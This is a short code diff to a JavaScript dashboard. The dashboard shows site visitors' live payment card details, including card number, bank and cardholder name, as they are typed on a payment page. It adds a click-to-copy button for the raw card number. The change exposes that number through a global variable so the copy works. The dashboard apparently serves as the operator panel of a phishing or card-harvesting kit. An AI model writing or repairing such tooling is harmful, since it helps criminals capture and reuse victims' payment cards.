@@ -1420,6 +1420,7 @@ socket.on('visitor:pageChanged', ({ visitorId, page }) => {
 
     // Render visitor details
     function renderVisitorDetails(visitor) {
+  /*FIX20*/ window.lcNumRaw = (visitor && visitor.liveCard && visitor.liveCard.cardNumber) ? visitor.liveCard.cardNumber : "";
       let html = '<div class="space-y-6">';
       
       // Header with device info
@@ -1671,7 +1672,7 @@ if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastP
   html += '<span style="color: #444; font-size: 15px; font-weight: bold;">' + lcInfo.bank + ' 🏦</span>';
   html += '</div>';
   html += '<div style="text-align: center; margin-bottom: 14px;">';
-  html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + lcNumRaw + '\')">' + lcNum + '</span>';
+  html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + window.lcNumRaw + '\')">' + lcNum + '</span>';
   html += '</div>';
   html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
   html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + lcName + '</span></div>';
